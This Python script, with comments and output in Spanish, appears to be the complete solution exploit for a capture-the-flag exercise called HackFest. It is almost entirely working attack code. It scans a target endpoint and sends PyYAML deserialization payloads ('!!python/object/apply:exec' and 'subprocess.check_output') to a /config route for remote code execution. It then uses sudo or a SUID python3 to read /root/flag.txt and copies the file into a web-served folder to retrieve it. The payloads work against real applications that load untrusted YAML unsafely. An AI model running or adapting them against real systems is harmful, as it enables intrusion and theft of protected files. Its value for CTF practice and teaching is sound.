#!/usr/bin/env python3
"""
HackFest CTF - Exploit Script Completo
=======================================

Este script demuestra el flujo completo de ataque del CTF:
1. Reconocimiento del sistema
2. Explotaci√≥n RCE via PyYAML
3. Escalada de privilegios usando SUID
4. Exfiltraci√≥n de flag
"""

import requests
import json
import sys

BASE_URL = "https://hackfest-railway-production.up.railway.app"

def print_banner():
    print("üöÄ HackFest CTF - Exploit Completo")
    print("=" * 50)

def fase_1_reconocimiento():
    print("\nüì° FASE 1: Reconocimiento del Sistema")
    print("-" * 40)

    try:
        response = requests.get(f"{BASE_URL}/api/system")
        if response.status_code == 200:
            data = response.json()
            print("‚úÖ Sistema accesible")
            print(f"   Usuario: {data.get('user')}")
            print(f"   Grupos: {data.get('groups')}")
            print(f"   SUID binaries: {data.get('suid_binaries')}")
            print(f"   Archivos interesantes: {data.get('interesting_files')}")
            print(f"   Directorios escribibles: {data.get('writable_dirs')}")
            return True
        else:
            print("‚ùå Error al acceder al sistema")
            return False
    except Exception as e:
        print(f"‚ùå Error de conexi√≥n: {e}")
        return False

def fase_2_rce_test():
    print("\nüíª FASE 2: Prueba de RCE")
    print("-" * 40)

    # Payload principal (Railway compatible)
    payload_escalation = """!!python/object/apply:exec
- |
  import subprocess
  import os

  # Encontrar d√≥nde busca realmente el endpoint uploads
  file_path = "/app/backend/app.py"
  upload_folder = os.path.join(os.path.dirname(file_path), "static")

  # Crear el directorio
  os.makedirs(upload_folder, exist_ok=True)

  # Leer la flag y escribirla
  flag = subprocess.check_output(["sudo", "cat", "/root/flag.txt"]).decode()

  # Escribir la flag en el lugar correcto
  with open(os.path.join(upload_folder, "flag.txt"), "w") as f:
    f.write(flag)"""

    try:
        response = requests.post(f"{BASE_URL}/config",
                               headers={'Content-Type': 'application/x-yaml'},
                               data=payload_escalation)

        if response.status_code == 200:
            print("‚úÖ RCE confirmado - Comando ejecutado")
            print("   (Salida no visible por dise√±o - simulando limitaci√≥n real)")
            return True
        else:
            print("‚ùå Error en RCE")
            return False
    except Exception as e:
        print(f"‚ùå Error en RCE: {e}")
        return False

def fase_3_escalada_y_exfiltracion():
    print("\n‚¨ÜÔ∏è FASE 3: Escalada de Privilegios y Exfiltraci√≥n")
    print("-" * 40)

    # Usando python3 con SUID para escalada real
    payload = """!!python/object/apply:subprocess.check_output
- ["python3", "-c", "import os; os.system('cp /root/flag.txt ./static/flag.txt')"]"""

    try:
        response = requests.post(f"{BASE_URL}/config",
                               headers={'Content-Type': 'application/x-yaml'},
                               data=payload)

        if response.status_code == 200:
            print("‚úÖ Escalada de privilegios exitosa")
            print("   - T√©cnica: SUID python3 (GTFObins)")
            print("   - Acci√≥n: Copia de /root/flag.txt a ./static/flag.txt")
            return True
        else:
            print("‚ùå Error en escalada")
            return False
    except Exception as e:
        print(f"‚ùå Error en escalada: {e}")
        return False

def fase_4_obtener_flag():
    print("\nüèÜ FASE 4: Obtenci√≥n de Flag")
    print("-" * 40)

    try:
        response = requests.get(f"{BASE_URL}/uploads/flag.txt")

        if response.status_code == 200:
            print("‚úÖ FLAG OBTENIDA:")
            print(f"   {response.text.strip()}")
            return True
        else:
            print("‚ùå Error al obtener flag")
            return False
    except Exception as e:
        print(f"‚ùå Error al obtener flag: {e}")
        return False

def verificar_realismo():
    print("\nüîç VERIFICACI√ìN DE REALISMO")
    print("-" * 40)
    print("‚úÖ T√©cnicas del mundo real utilizadas:")
    print("   ‚Ä¢ PyYAML RCE - Vulnerabilidad real com√∫n")
    print("   ‚Ä¢ SUID escalation - T√©cnica GTFObins aut√©ntica")
    print("   ‚Ä¢ Exfiltraci√≥n a web-accessible directory")
    print("   ‚Ä¢ Reconocimiento post-explotaci√≥n")
    print("   ‚Ä¢ No hay mecanismos artificiales")
    print()
    print("‚úÖ Limitaciones realistas:")
    print("   ‚Ä¢ No hay output directo de comandos RCE")
    print("   ‚Ä¢ Requiere exfiltraci√≥n para obtener datos")
    print("   ‚Ä¢ Escalada real de privilegios necesaria")

def main():
    print_banner()

    if not fase_1_reconocimiento():
        sys.exit(1)

    if not fase_2_rce_test():
        sys.exit(1)

    if not fase_3_escalada_y_exfiltracion():
        sys.exit(1)

    if not fase_4_obtener_flag():
        sys.exit(1)

    verificar_realismo()

    print("\nüéâ EXPLOIT COMPLETO EXITOSO!")
    print("   HackFest CTF completado con t√©cnicas del mundo real")

if __name__ == "__main__":
    main()
